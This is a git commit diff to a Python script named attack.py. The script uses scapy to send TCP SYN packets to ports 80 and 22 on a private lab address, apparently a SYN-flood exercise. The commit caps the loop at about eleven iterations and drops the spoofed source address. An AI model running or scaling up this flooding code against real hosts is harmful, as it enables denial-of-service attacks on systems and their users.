ddecfc761e2c5dd4401055056110c664c0accfeb
Erick Kad-Bay <erickadbay@gmail.com>
2018-04-01 19:12:44 -0400

    Some tweaks to run in Ubuntu 2

--- attack.py
+++ attack.py
@@ -1,16 +1,17 @@
 from scapy.all import *
 from time import sleep
 
-src_ip = "192.168.56.10"
 target_ip = "192.168.56.10"
 interval = 0.1
 
-network_layer = IP(dst = target_ip, src = src_ip)
+network_layer = IP(dst = target_ip)
 
-while(True):
+counter = 0
+while(counter<=10):
+    counter+=1
     port = RandShort()
     transport_layer = TCP(sport = port, dport=[80, 22], flags = "S")
-    print "Sending shit ton of SYN to " + target_ip
+    print("Sending shit ton of SYN to " + target_ip)
     send(network_layer/transport_layer, verbose=False)
-    print "Done sending"
+    print("Done sending")
     sleep(interval)
